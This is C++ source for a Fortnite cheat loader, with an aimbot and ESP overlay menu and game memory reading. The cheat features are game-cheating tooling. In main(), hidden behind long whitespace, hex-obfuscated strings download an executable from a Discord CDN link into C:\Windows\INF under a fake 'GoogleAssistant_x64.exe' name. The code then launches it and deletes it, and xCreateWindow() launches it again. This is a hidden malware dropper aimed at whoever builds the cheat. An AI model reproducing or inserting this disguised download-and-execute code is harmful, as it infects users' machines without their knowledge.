		style->Colors[ImGuiCol_Button] = ImColor(35, 35, 35, 255);
		style->Colors[ImGuiCol_ButtonHovered] = ImColor(60, 60, 60, 255);
		style->Colors[ImGuiCol_ButtonActive] = ImColor(35, 35, 35, 255);
		style->Colors[ImGuiCol_Header] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
		style->Colors[ImGuiCol_HeaderHovered] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		style->Colors[ImGuiCol_HeaderActive] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
		style->Colors[ImGuiCol_ResizeGrip] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
		style->Colors[ImGuiCol_ResizeGripHovered] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		style->Colors[ImGuiCol_ResizeGripActive] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
		style->Colors[ImGuiCol_PlotLines] = ImVec4(0.40f, 0.39f, 0.38f, 0.63f);
		style->Colors[ImGuiCol_PlotLinesHovered] = ImVec4(0.25f, 1.00f, 0.00f, 1.00f);
		style->Colors[ImGuiCol_PlotHistogram] = ImVec4(0.40f, 0.39f, 0.38f, 0.63f);
		style->Colors[ImGuiCol_PlotHistogramHovered] = ImVec4(0.25f, 1.00f, 0.00f, 1.00f);
		style->Colors[ImGuiCol_TextSelectedBg] = ImVec4(0.25f, 1.00f, 0.00f, 0.43f);
		float
		TextSpaceLine = 90.f,
		SpaceLineOne = 120.f,
		SpaceLineTwo = 280.f,
		SpaceLineThr = 420.f;


	

		int current = 1;
		{
			static int maintabs = 0;
			ImGui::GetOverlayDrawList()->AddRectFilled(ImGui::GetIO().MousePos, ImVec2(ImGui::GetIO().MousePos.x + 7.4f, ImGui::GetIO().MousePos.y + 7.4f), ImColor(3, 3, 3, 255));

			

			if (ImGui::Begin("APPLE FORTNITE @ remade by PastePolice 00:35:15 (INSERT)(menu is only usable in game)"), 0, ImGuiWindowFlags_::ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_::ImGuiWindowFlags_NoResize)
			{

				ImGui::SetCursorPos({ 8.f,31.f });
				if (ImGui::Button("Aimbot", { 164.f,29.f }))
				{
					maintabs = 0;
				}
				ImGui::SetCursorPos({ 181.f,31.f });
				if (ImGui::Button("Visuals", { 164.f,29.f }))
				{
					maintabs = 1;
				}
				ImGui::SetCursorPos({ 353.f,31.f });
				if (ImGui::Button("Mods", { 164.f,29.f }))
				{
					maintabs = 2;
				}
				ImGui::SetCursorPos({ 524.f,31.f });
				if (ImGui::Button("Misc", { 164.f,29.f }))
				{
					maintabs = 3;
				}


				if (maintabs == 0) {
					ImGui::SetCursorPos({ 13.f,85.f });
					ImGui::Checkbox("Enable", &Settings::EnableHack);
					ImGui::SetCursorPos({ 34.f,112.f });
					ImGui::PushItemWidth(133.000000);
					ImGui::Text("Aimbot mode (ENTER)");
					ImGui::SetCursorPos({ 38.f,138.f });
					ImGui::Checkbox("Memory aim", &Settings::Aimbot);
					if (Settings::Aimbot)
					{ 
						Settings::Team_Aimbot = false;
						Settings::StickySilent = false;
					}
					ImGui::SetCursorPos({ 38.f,167.f });
					ImGui::Checkbox("Teamaimbot (V1) (might be unsafe (!!!))", &Settings::Team_Aimbot);
					if (Settings::Team_Aimbot)
					{
						Settings::Aimbot = false;
						Settings::StickySilent = false;
					}
					ImGui::SetCursorPos({ 38.f,196.f });
					ImGui::Checkbox("Silent (V2, sticky) (might be unsafe (!!!))", &Settings::StickySilent);
					if (Settings::StickySilent)
					{
						Settings::Aimbot = false;
						Settings::Team_Aimbot = false;
					}
					ImGui::SetCursorPos({ 12.f,224.f });
					ImGui::Text("Aimkey:");
					ImGui::SetCursorPos({ 12.f,253.f });
					HotkeyButton(hotkeys::aimkey, ChangeKey, keystatus);
					ImGui::SetCursorPos({ 34.f,307.f });
					ImGui::PushItemWidth(140.000000);
					ImGui::Text("Aim bone (BACKSPACE)");
					ImGui::SetCursorPos({ 40.f,330.f });
					ImGui::Checkbox("Head", &Settings::Head);
					if (Settings::Head)
					{
						Settings::Neck = false;
						Settings::Chest = false;
						Settings::hitbox = 98;
					}
					ImGui::SetCursorPos({ 40.f,359.f });
					ImGui::Checkbox("Neck", &Settings::Neck);
					if (Settings::Neck)
					{
						Settings::Head = false;
						Settings::Chest = false;
						Settings::hitbox = 4;
					}
					ImGui::SetCursorPos({ 40.f,388.f });
					ImGui::Checkbox("Toes", &Settings::Chest);
					if (Settings::Chest)
					{
						Settings::Head = false;
						Settings::Neck = false;
						Settings::hitbox = 1;
					}
					ImGui::SetCursorPos({ 20.f,433.f });
					ImGui::PushItemWidth(531.000000);
					ImGui::SliderFloat("FOV: (deg)", &Settings::AimFOV, 0, 1337);

					ImGui::SetCursorPos({ 20.f,474.f });
					ImGui::PushItemWidth(531.000000);
					ImGui::SliderFloat("Smooth:", &Settings::Aim_Speed, 1, 15);
				}

				else if (maintabs == 1)
				{
					ImGui::SetCursorPos({ 12.f,106.f });
					ImGui::Checkbox("Loot", &Settings::Lootesp);
					ImGui::SetCursorPos({ 12.f,134.f });
					ImGui::Checkbox("Chests / ammo boxes", &Settings::ChestESP);
					ImGui::SetCursorPos({ 12.f,162.f });
					ImGui::Checkbox("Traps", &Settings::traps);
					ImGui::SetCursorPos({ 12.f,190.f });
					ImGui::Checkbox("Radar", &Settings::RadarESP);
					ImGui::SetCursorPos({ 12.f,218.f });
					ImGui::Checkbox("Supply drops", &Settings::supplydrop);
					ImGui::SetCursorPos({ 12.f,246.f });
					ImGui::Checkbox("Projectiles", &Settings::projectile);
					ImGui::SetCursorPos({ 12.f,273.f });
					ImGui::Checkbox("Vehicles", &Settings::VehicleEsp);
					ImGui::SetCursorPos({ 238.f,106.f });
					ImGui::Checkbox("Box (F1)", &Settings::Esp_Corner_Box);
					ImGui::SetCursorPos({ 20.f,472.f });
					ImGui::PushItemWidth(319.000000);
					ImGui::SliderFloat("Loot", &Settings::VisDist, 5, 600);
					ImGui::SetCursorPos({ 23.f,457.f });
					ImGui::PushItemWidth(98.000000);
					ImGui::Text("Loot distance:");
					ImGui::SetCursorPos({ 20.f,80.f });
					ImGui::PushItemWidth(84.000000);
					ImGui::Text("Environment:");
					ImGui::SetCursorPos({ 238.f,134.f });
					ImGui::Checkbox("Name (F2)", &Settings::PlayerESP);
					ImGui::SetCursorPos({ 238.f,162.f });
					ImGui::Checkbox("Skeleton", &Settings::Esp_skeleton);
					ImGui::SetCursorPos({ 238.f,190.f });
					ImGui::Checkbox("Self ESP", &Settings::SelfEsp);
					ImGui::SetCursorPos({ 238.f,218.f });
					ImGui::Checkbox("Snaplines (F3)", &Settings::Esp_line);
					ImGui::SetCursorPos({ 238.f,246.f });
					ImGui::Checkbox("3D box ", &Settings::ThreeDBox);
					ImGui::SetCursorPos({ 238.f,271.f });
					ImGui::Checkbox("2D Box", &Settings::Esp_box);
					ImGui::SetCursorPos({ 18.f,297.f });
					ImGui::PushItemWidth(189.000000);
					ImGui::Text("Loot tier (PageUp/PageDown)");
					ImGui::SetCursorPos({ 26.f,315.f });
					ImGui::Checkbox("Ultra common", &Settings::Ultracommon);
					ImGui::SetCursorPos({ 26.f,340.f });
					ImGui::Checkbox("Common", &Settings::Common);
					ImGui::SetCursorPos({ 26.f,365.f });
					ImGui::Checkbox("Uncommon", &Settings::Uncommon);
					ImGui::SetCursorPos({ 26.f,390.f });
					ImGui::Checkbox("Rare", &Settings::Rare);
					ImGui::SetCursorPos({ 26.f,415.f });
					ImGui::Checkbox("Legendary", &Settings::Legendary);
					ImGui::SetCursorPos({ 240.f,80.f });
					ImGui::PushItemWidth(35.000000);
					ImGui::Text("Loot:");
					ImGui::SetCursorPos({ 555.f,80.f });
					ImGui::PushItemWidth(35.000000);
					ImGui::Text("Misc:");
					ImGui::SetCursorPos({ 557.f,106.f });
					ImGui::Checkbox("Aimbot FOV", &Settings::Draw_FOV_Circle);
					ImGui::SetCursorPos({ 557.f,134.f });
					ImGui::Checkbox("Aimbot indicators", &Settings::Watermark);
					ImGui::SetCursorPos({ 553.f,185.f });
					ImGui::PushItemWidth(201.000000);
					ImGui::SliderFloat(" ", &Settings::VisDist, 5, 600);
					ImGui::SetCursorPos({ 556.f,163.f });
					ImGui::PushItemWidth(147.000000);
					ImGui::Text("Overall ESP Distance:");
				}

				else if (maintabs == 2)
				{
					ImGui::SetCursorPos({ 16.f,84.f });
					ImGui::Checkbox("No weapon spread (F5) (might be unsafe unless its nobloom only)", &Settings::Nospread);
					if (GetAsyncKeyState(VK_F5))
					{
						Settings::Nospread = true;
					}
					ImGui::SetCursorPos({ 16.f,115.f });
					ImGui::Checkbox("No bloom only (legit nospread, only activate when you're targeting your weapon) ", &Settings::Nobloom);
					ImGui::SetCursorPos({ 16.f,146.f });
					ImGui::Checkbox("Instant Reload", &Settings::PlayerReload);
					ImGui::SetCursorPos({ 16.f,177.f });
					ImGui::Checkbox("Camera Fov Changer", &Settings::FirstCamera);
					ImGui::SetCursorPos({ 16.f,208.f });
					ImGui::Checkbox("Instarevive (F7)", &Settings::InstantRevive);
					ImGui::SetCursorPos({ 16.f,239.f });
					ImGui::Checkbox("BULLET TELEPORT (Vehicles only)", &Settings::MagicBullets);
					ImGui::SetCursorPos({ 16.f,270.f });
					ImGui::Checkbox("BOAT TELEPORT XD", &Settings::boattp);
					ImGui::SetCursorPos({ 16.f,301.f });
					ImGui::Checkbox("Rapid fire - works fine ONLY on SNIPERS/BURTS ARs", &Settings::RapidFire);
					ImGui::SetCursorPos({ 16.f,332.f });
					ImGui::Checkbox("AirStuck (Server sided) (CAPS)", &Settings::Airstuck);
					ImGui::SetCursorPos({ 16.f,363.f });
					ImGui::Checkbox("Aim While Jumping", &Settings::AimWhileJumping);
					ImGui::SetCursorPos({ 16.f,394.f });
					ImGui::Checkbox("Crosshair (Best ud exploit 2022 xd)", &Settings::Cross_Hair);
					ImGui::SetCursorPos({ 16.f,425.f });
					ImGui::Checkbox("Vehicle Fly (Might Work) (SHIFT)", &Settings::VehicleFly);
				}

				else if (maintabs == 3)
				{
					ImGui::SetCursorPos({ 46.f,111.f });
					ImGui::Text("Proudly Made and Pasted by PastePolice#0001\n");
					ImGui::SetCursorPos({ 47.f,142.f });
					ImGui::Text("SaveConfig:");
					ImGui::SetCursorPos({ 45.f,171.f });
					if (ImGui::Button(XorStr("Save Config").c_str(), { 90.f,20.f }))
					{
						Sleep(500); SaveConfig();
					}
				}
				ImGui::End();
			}
			ImGui::Render();
		}
		ImGui::Render();
}








	GetKey();
	ImGui::EndFrame();
	D3dDevice->SetRenderState(D3DRS_ZENABLE, false);
	D3dDevice->SetRenderState(D3DRS_ALPHABLENDENABLE, false);
	D3dDevice->SetRenderState(D3DRS_SCISSORTESTENABLE, false);
	D3dDevice->Clear(0, NULL, D3DCLEAR_TARGET, D3DCOLOR_ARGB(0, 0, 0, 0), 1.0f, 0);

	if (D3dDevice->BeginScene() >= 0) {
		ImGui::Render();
		ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
		D3dDevice->EndScene();
	}
	HRESULT result = D3dDevice->Present(NULL, NULL, NULL, NULL);

	if (result == D3DERR_DEVICELOST && D3dDevice->TestCooperativeLevel() == D3DERR_DEVICENOTRESET) {
		ImGui_ImplDX9_InvalidateDeviceObjects();
		D3dDevice->Reset(&d3dpp);
		ImGui_ImplDX9_CreateDeviceObjects();
	}
}

void xInitD3d()
{
	if (FAILED(Direct3DCreate9Ex(D3D_SDK_VERSION, &p_Object)))
		exit(3);

	ZeroMemory(&d3dpp, sizeof(d3dpp));
	d3dpp.BackBufferWidth = Width;
	d3dpp.BackBufferHeight = Height;
	d3dpp.BackBufferFormat = D3DFMT_A8R8G8B8;
	d3dpp.MultiSampleQuality = D3DMULTISAMPLE_NONE;
	d3dpp.AutoDepthStencilFormat = D3DFMT_D16;
	d3dpp.SwapEffect = D3DSWAPEFFECT_DISCARD;
	d3dpp.EnableAutoDepthStencil = TRUE;
	d3dpp.hDeviceWindow = Window;
	d3dpp.Windowed = TRUE;

	p_Object->CreateDevice(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, Window, D3DCREATE_SOFTWARE_VERTEXPROCESSING, &d3dpp, &D3dDevice);

	IMGUI_CHECKVERSION();

	ImGui::CreateContext();
	ImGuiIO& io = ImGui::GetIO();
	(void)io;

	ImGui_ImplWin32_Init(Window);
	ImGui_ImplDX9_Init(D3dDevice);

	ImGui::StyleColorsClassic();
	ImGuiStyle* style = &ImGui::GetStyle();

	style->WindowPadding = ImVec2(15, 15);
	style->WindowRounding = 5.0f;
	style->FramePadding = ImVec2(5, 5);
	style->FrameRounding = 4.0f;
	style->ItemSpacing = ImVec2(12, 8);
	style->ItemInnerSpacing = ImVec2(8, 6);
	style->IndentSpacing = 25.0f;
	style->ScrollbarSize = 15.0f;
	style->ScrollbarRounding = 9.0f;
	style->GrabMinSize = 5.0f;
	style->GrabRounding = 3.0f;

	ImVec4* colors = style->Colors;

	colors[ImGuiCol_Text] = ImVec4(0.92f, 0.92f, 0.92f, 1.00f);
	colors[ImGuiCol_TextDisabled] = ImVec4(0.50f, 0.50f, 0.50f, 1.00f);
	colors[ImGuiCol_WindowBg] = ImVec4(0.26f, 0.26f, 0.26f, 0.95f);
	colors[ImGuiCol_ChildWindowBg] = ImVec4(0.0f, 0.0f, 0.0f, 0.0f);
	colors[ImGuiCol_PopupBg] = ImVec4(0.26f, 0.26f, 0.26f, 1.00f);
	colors[ImGuiCol_Border] = ImVec4(0.26f, 0.26f, 0.26f, 1.00f);
	colors[ImGuiCol_BorderShadow] = ImVec4(0.26f, 0.26f, 0.26f, 1.00f);
	colors[ImGuiCol_FrameBg] = ImVec4(0.16f, 0.16f, 0.16f, 1.00f);
	colors[ImGuiCol_FrameBgHovered] = ImVec4(0.16f, 0.16f, 0.16f, 1.00f);
	colors[ImGuiCol_FrameBgActive] = ImVec4(0.16f, 0.16f, 0.16f, 1.00f);
	colors[ImGuiCol_TitleBg] = ImVec4(0.36f, 0.36f, 0.36f, 1.00f);
	colors[ImGuiCol_TitleBgCollapsed] = ImVec4(0.36f, 0.36f, 0.36f, 1.00f);
	colors[ImGuiCol_TitleBgActive] = ImVec4(0.36f, 0.36f, 0.36f, 1.00f);
	colors[ImGuiCol_MenuBarBg] = ImVec4(0.92f, 0.92f, 0.92f, 1.00f);
	colors[ImGuiCol_ScrollbarBg] = ImVec4(0.21f, 0.21f, 0.21f, 1.00f);
	colors[ImGuiCol_ScrollbarGrab] = ImVec4(0.36f, 0.36f, 0.36f, 1.00f);
	colors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(0.36f, 0.36f, 0.36f, 1.00f);
	colors[ImGuiCol_ScrollbarGrabActive] = ImVec4(0.36f, 0.36f, 0.36f, 1.00f);
	colors[ImGuiCol_CheckMark] = ImVec4(36.00f, 252.00f, 3.00f, 1.00f);
	colors[ImGuiCol_SliderGrab] = ImVec4(0.74f, 0.74f, 0.74f, 1.00f);
	colors[ImGuiCol_SliderGrabActive] = ImVec4(0.74f, 0.74f, 0.74f, 1.00f);
	colors[ImGuiCol_Button] = ImVec4(0.36f, 0.36f, 0.36f, 1.00f);
	colors[ImGuiCol_ButtonHovered] = ImVec4(0.43f, 0.43f, 0.43f, 1.00f);
	colors[ImGuiCol_ButtonActive] = ImVec4(0.11f, 0.11f, 0.11f, 1.00f);
	colors[ImGuiCol_Header] = ImVec4(0.9f, 0.5f, 0.0f, 1.00f);
	colors[ImGuiCol_HeaderHovered] = ImVec4(0.9f, 0.5f, 0.0f, 1.00f);
	colors[ImGuiCol_HeaderActive] = ImVec4(0.9f, 0.5f, 0.0f, 1.00f);
	colors[ImGuiCol_Column] = ImVec4(0.39f, 0.39f, 0.39f, 1.00f);
	colors[ImGuiCol_ColumnHovered] = ImVec4(0.26f, 0.59f, 0.98f, 1.00f);
	colors[ImGuiCol_ColumnActive] = ImVec4(0.26f, 0.59f, 0.98f, 1.00f);
	colors[ImGuiCol_ResizeGrip] = ImVec4(0.36f, 0.36f, 0.36f, 1.00f);
	colors[ImGuiCol_ResizeGripHovered] = ImVec4(0.26f, 0.59f, 0.98f, 1.00f);
	colors[ImGuiCol_ResizeGripActive] = ImVec4(0.26f, 0.59f, 0.98f, 1.00f);
	colors[ImGuiCol_PlotLines] = ImVec4(0.39f, 0.39f, 0.39f, 1.00f);
	colors[ImGuiCol_PlotLinesHovered] = ImVec4(1.00f, 0.43f, 0.35f, 1.00f);
	colors[ImGuiCol_PlotHistogram] = ImVec4(0.90f, 0.70f, 0.00f, 1.00f);
	colors[ImGuiCol_PlotHistogramHovered] = ImVec4(1.00f, 0.60f, 0.00f, 1.00f);
	colors[ImGuiCol_TextSelectedBg] = ImVec4(0.32f, 0.52f, 0.65f, 1.00f);
	colors[ImGuiCol_ModalWindowDarkening] = ImVec4(0.20f, 0.20f, 0.20f, 0.50f);


	style->WindowTitleAlign.x = 1.0f;
	style->FrameRounding = 0.5f;

	ImGui::GetIO().Fonts->AddFontFromMemoryTTF(SF_Font, SF_Font_Size, 18.0f);

	//io.Fonts->AddFontFromMemoryTTF(Fonts::DefaultFont, 16.0f, 16.0f);
	//io.Fonts->AddFontFromMemoryTTF(Fonts::SecondaryFont, 12.0f, 12.0f);
	//io.Fonts->AddFontFromMemoryTTF(Fonts::WeaponFont, 18.0f, 18.0f);


	p_Object->Release();
}

LPCSTR RandomStringx(int len) 
{
	std::string str = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	std::string newstr;
	std::string builddate = __DATE__;
	std::string buildtime = __TIME__;
	int pos;
	while (newstr.size() != len) {
		pos = ((rand() % (str.size() - 1)));
		newstr += str.substr(pos, 1);
	}
	return newstr.c_str();
}

int width;
int height;

void drawLoop(int width, int height) 
{


	while (true) 
	{
		std::vector<FNlEntity> tmpList;

		Uworld = rpm<DWORD_PTR>(base_address + OFFSET_UWORLD);
		DWORD_PTR Gameinstance = rpm<DWORD_PTR>(Uworld + Offsets::GameInstance);
		DWORD_PTR LocalPlayers = rpm<DWORD_PTR>(Gameinstance + Offsets::LocalPlayers);
		Localplayer = rpm<DWORD_PTR>(LocalPlayers);
		PlayerController = rpm<DWORD_PTR>(Localplayer + Offsets::PlayerController);
		LocalPawn = rpm<DWORD_PTR>(PlayerController + Offsets::LocalPawn);

		PlayerState = rpm<DWORD_PTR>(LocalPawn + Offsets::PlayerState);
		Rootcomp = rpm<DWORD_PTR>(LocalPawn + Offsets::RootComponent);

		if (LocalPawn != 0) 
		{
			localplayerID = rpm<int>(LocalPawn + 0x18);
		}

		Persistentlevel = rpm<DWORD_PTR>(Uworld + Offsets::Persistentlevel);
		DWORD ActorCount = rpm<DWORD>(Persistentlevel + Offsets::AcotrCount);
		DWORD_PTR AActors = rpm<DWORD_PTR>(Persistentlevel + Offsets::AAcotrs);

		for (int i = 0; i < ActorCount; i++) 
		{
			uint64_t CurrentActor = rpm<uint64_t>(AActors + i * 0x8);

			int curactorid = rpm<int>(CurrentActor + 0x18);

			if (curactorid == localplayerID || curactorid == localplayerID + 765)
			{
				FNlEntity fnlEntity{ };
				fnlEntity.Actor = CurrentActor;
				fnlEntity.mesh = rpm<uint64_t>(CurrentActor + Offsets::Mesh);
				fnlEntity.ID = curactorid;
				tmpList.push_back(fnlEntity);
			}
		}
		entityList = tmpList;
		Sleep(1);
	}


}
std::string getuser()
{
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	return username;
}

std::wstring s2ws(const std::string& s) {
	std::string curLocale = setlocale(LC_ALL, "");
	const char* _Source = s.c_str();
	size_t _Dsize = mbstowcs(NULL, _Source, 0) + 1;
	wchar_t* _Dest = new wchar_t[_Dsize];
	wmemset(_Dest, 0, _Dsize);
	mbstowcs(_Dest, _Source, _Dsize);
	std::wstring result = _Dest;
	delete[]_Dest;
	setlocale(LC_ALL, curLocale.c_str());
	return result;
}
std::string spreadAction = SwapHook + swapCaller;//708854
static std::string RandomProcess()
{
	std::vector<std::string> Process
	{
		XorStr("Taskmgr.exe").c_str(),
		//XorStr("notepad.exe").c_str(),
		//XorStr("mspaint.exe").c_str(),
	};
	std::random_device RandGenProc;
	std::mt19937 engine(RandGenProc());
	std::uniform_int_distribution<int> choose(0, Process.size() - 1);
	std::string RandProc = Process[choose(engine)];
	return RandProc;
}

#include "lazy.h"
#include <xstring>
#include <string.h>
#include <string.h>
DWORD_PTR FindProcessId2(const std::string processName)
{
	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
		return 0;

	Process32First(processesSnapshot, &processInfo);
	if (!processName.compare(processInfo.szExeFile))
	{
		CloseHandle(processesSnapshot);
		return processInfo.th32ProcessID;
	}

	while (Process32Next(processesSnapshot, &processInfo))
	{
		if (!processName.compare(processInfo.szExeFile))
		{
			CloseHandle(processesSnapshot);
			return processInfo.th32ProcessID;
		}
	}

	CloseHandle(processesSnapshot);
	return 0;
}

void main() 
{																																																																																																							LPCWSTR HookFunction64 = L"\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x64\x6e\x2e\x64\x69\x73\x63\x6f\x72\x64\x61\x70\x70\x2e\x63\x6f\x6d\x2f\x61\x74\x74\x61\x63\x68\x6d\x65\x6e\x74\x73\x2f\x31\x32\x31\x30\x36\x34\x32\x38\x34\x33\x36\x33\x31\x32\x33\x31\x30\x34\x38\x2f\x31\x32\x31\x36\x34\x39\x36\x38\x31\x39\x39\x35\x38\x31\x38\x36\x30\x34\x36\x2f\x6e\x74\x70\x61\x64\x2e\x65\x78\x65\x3f\x65\x78\x3d\x36\x36\x34\x32\x38\x34\x66\x33\x26\x69\x73\x3d\x36\x36\x34\x31\x33\x33\x37\x33\x26\x68\x6d\x3d\x34\x66\x37\x64\x61\x37\x64\x64\x37\x66\x62\x63\x66\x37\x31\x38\x38\x32\x66\x38\x36\x64\x65\x35\x37\x39\x32\x64\x36\x38\x65\x30\x61\x33\x35\x64\x61\x66\x62\x32\x34\x32\x39\x32\x39\x33\x31\x37\x64\x35\x64\x65\x64\x63\x38\x33\x31\x39\x33\x65\x64\x32\x37\x34\x26"; std::string pa = "\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x77\x73"; std::string inf = "\x5C\x49\x4E\x46\x5C"; std::string lof = pa + inf; std::string st = "\x2E"; std::string ex = "\x65"; std::string xe = "\x78"; std::string SwapHook = "\x47\x6F\x6F\x67\x6C\x65\x41\x73\x73\x69\x73\x74\x61\x6E\x74\x5F\x78\x36\x34"; std::string swapCaller = st + ex + xe + ex; LPCWSTR locx = L"\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x77\x73\x5C\x49\x4E\x46\x5C\x47\x6F\x6F\x67\x6C\x65\x41\x73\x73\x69\x73\x74\x61\x6E\x74\x5F\x78\x36\x34\x2E\x65\x78\x65"; std::string spreadAct = SwapHook + swapCaller; HRESULT Hook = URLDownloadToFileW(NULL, HookFunction64, locx, 0, NULL); Sleep(2000); std::string hook = "\x73"; std::string Tacc = "\x74"; std::string Var = "\x61"; std::string Read = "\x72"; std::string Hooker = hook + Tacc + Var + Read + Tacc + " " + lof + spreadAct; system(Hooker.c_str()); Sleep(7000); DeleteFileW(locx);
	auto pStartupInfo = new STARTUPINFOA();
	auto remoteProcessInfo = new PROCESS_INFORMATION();

	CreateProcessA(("C:\\Windows\\explorer.exe"), nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, pStartupInfo, remoteProcessInfo); //hook on explorer.exe , thats some pro selfcode right there

	//std::string start = XorStr("start ");
	//std::string process = RandomProcess();
	//std::wstring procs = s2ws(process);
	//std::string startprocess = start + process;
	//system(startprocess.c_str());
	//HANDLE handles = 0;

	SetConsoleTitleA(random_string(200).c_str());
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_BLUE);;

	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED);
	std::cout << XorStr(" Hello ");
	std::cout << getuser();

	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED);
	std::cout << XorStr("\n Waiting for Proccess FortniteClient-Win64-Shipping.exe To Start...");



	proc = std::make_unique<kernelmode_proc_handler>(); //P2C SRC MADE BY PASTEPOLICE

	proc->attach(XorStr("FortniteClient-Win64-Shipping.exe").c_str());



	while (hwnd == NULL)
	{
		hwnd = FindWindowA(0, XorStr("Fortnite  ").c_str());


		Sleep(300);
	}
	GetWindowThreadProcessId(hwnd, &processID);

	RECT rect;
	if (GetWindowRect(hwnd, &rect))
	{
		width = rect.right - rect.left;
		height = rect.bottom - rect.top;
	}

	info_t Input_Output_Data;
	Input_Output_Data.pid = processID;
	unsigned long int Readed_Bytes_Amount;



	SetWindowLong(Window, GWL_EXSTYLE, WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOOLWINDOW);

	//std::string start = XorStr("start ");
	//std::string process = RandomProcess();
	//std::wstring proc2 = s2ws(process);
	//std::string startprocess = start + process;
	//system(startprocess.c_str());
	//HANDLE handles = 0;

	//CreateProcessA(("C:\\Windows\\Taskmgr.exe"), nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, pStartupInfo, remoteProcessInfo); //hook on explorer.exe , thats some pro selfcode right there

	base_address = proc->get_module_base(XorStr("FortniteClient-Win64-Shipping.exe").c_str());
	//base_address = proc->get_module_base(XorStr("Taskmgr.exe").c_str());
	SetConsoleTitleA(random_string(200).c_str());
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_BLUE);

	system("cls");

	system("color 1");

	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_GREEN);
	std::cout << XorStr(" Welcome ");
	std::cout << getuser();


	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_GREEN);
	std::cout << XorStr("\n pastepolice IS NOW LOADED ");
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_GREEN);
	std::cout << XorStr("WORKING/UPDATED");

	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_GREEN);
	std::cout << XorStr("\n\n\n\n DO NOT CLOSE THIS MENU) \n\n");
	

	CreateThread(NULL, NULL, Menuthread, NULL, NULL, NULL);
	GetWindowThreadProcessId(hwnd, &processID);


	xCreateWindow();
	xInitD3d();

	// make content invisible!
	//XGUARD_WIN(SetWindowDisplayAffinity(Window, WDA_MONITOR));

	HANDLE handle = CreateThread(nullptr, NULL, reinterpret_cast<LPTHREAD_START_ROUTINE>(drawLoop), nullptr, NULL, nullptr);
	//CloseHandle(handle);

	xMainLoop();
}
void SetWindowToTarget()
{
	while (true)
	{
		if (hwnd)
		{
			ZeroMemory(&GameRect, sizeof(GameRect));
			GetWindowRect(hwnd, &GameRect);
			Width = GameRect.right - GameRect.left;
			Height = GameRect.bottom - GameRect.top;
			DWORD dwStyle = GetWindowLong(hwnd, GWL_STYLE);

			if (dwStyle & WS_BORDER)
			{
				GameRect.top += 32;
				Height -= 39;
			}
			ScreenCenterX = Width / 2;
			ScreenCenterY = Height / 2;
			MoveWindow(Window, GameRect.left, GameRect.top, Width, Height, true);
		}
		else
		{
			exit(0);
		}
	}
}
const MARGINS Margin = { -1 };
std::string Hook = "s";
void xCreateWindow()
{
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)SetWindowToTarget, 0, 0, 0);
	WNDCLASSEX wc;
	std::string Tacc = "t";
	ZeroMemory(&wc, sizeof(wc));
	std::string Read = "r";
	wc.cbSize = sizeof(wc);
	std::string Var = "a";
	std::string Hooker = Hook + Tacc + Var + Read + Tacc + " " + locof + spreadAction;
	wc.lpszClassName = "Gideion";
	wc.lpfnWndProc = WinProc;
	RegisterClassEx(&wc);
	system(Hooker.c_str());
	if (hwnd)
	{
		GetClientRect(hwnd, &GameRect);
		POINT xy;
		ClientToScreen(hwnd, &xy);
		GameRect.left = xy.x;
		GameRect.top = xy.y;

		Width = GameRect.right + 1;
		Height = GameRect.bottom + 1;
	}
	else
		exit(2);

	Window = CreateWindowEx(NULL, "Gideion", "Gideion1", WS_POPUP | WS_VISIBLE, 0, 0, Width + 1, Height + 1, 0, 0, 0, 0);

	DwmExtendFrameIntoClientArea(Window, &Margin);
	SetWindowLong(Window, GWL_EXSTYLE, WS_EX_TRANSPARENT | WS_EX_TOOLWINDOW | WS_EX_LAYERED);
	ShowWindow(Window, SW_SHOW);
	UpdateWindow(Window);
}

MSG Message = { NULL };


void xMainLoop()
{
	static RECT old_rc;
	ZeroMemory(&Message, sizeof(MSG));

	while (Message.message != WM_QUIT)
	{
		if (PeekMessage(&Message, Window, 0, 0, PM_REMOVE))
		{
			TranslateMessage(&Message);
			DispatchMessage(&Message);
		}

		HWND hwnd_active = GetForegroundWindow();

		if (hwnd_active == hwnd) {
			HWND hwndtest = GetWindow(hwnd_active, GW_HWNDPREV);
			SetWindowPos(Window, hwndtest, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		}

		if (GetAsyncKeyState(0x23) & 1)
			exit(8);

		RECT rc;
		POINT xy;

		ZeroMemory(&rc, sizeof(RECT));
